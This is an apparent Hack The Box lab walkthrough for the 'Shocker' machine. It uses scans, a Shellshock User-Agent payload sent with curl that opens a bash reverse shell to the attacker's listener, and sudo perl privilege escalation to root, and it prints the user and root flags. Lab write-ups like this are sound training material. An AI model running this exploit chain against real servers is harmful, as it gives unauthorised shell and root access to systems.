# shocker <br> <https://app.hackthebox.com/machines/Shocker>

```bash
nmap -sC -sV 10.10.10.56
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
```

```bash
dirb http://10.10.10.56/
+ http://10.10.10.56/cgi-bin/ (CODE:403|SIZE:294)
```

```bash
sudo nmap 10.10.10.56 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/user.sh

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-18 10:21 EDT
Nmap scan report for 10.10.10.56
Host is up (0.078s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       http://seclists.org/oss-sec/2014/q3/685
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
```

```bash
# Reverse shell using curl
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.8/9995 0>&1' http://10.10.10.56/cgi-bin/user.sh

# nc listener
nc -lvnp 9995
```

```bash
shelly@Shocker:/home/shelly$ cat user.txt
cat user.txt
4778864763a57805478af5b1b6ac8ba6
```

```bash
shelly@Shocker:/var/backups$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
15d7f1982775fc3f7dd5e0d2fee2a778
```

***References*** <br>
<a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi" target="_blank">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi</a> <br>
<a href="https://gtfobins.github.io/gtfobins/perl/#sudo" target="_blank">https://gtfobins.github.io/gtfobins/perl/#sudo</a>

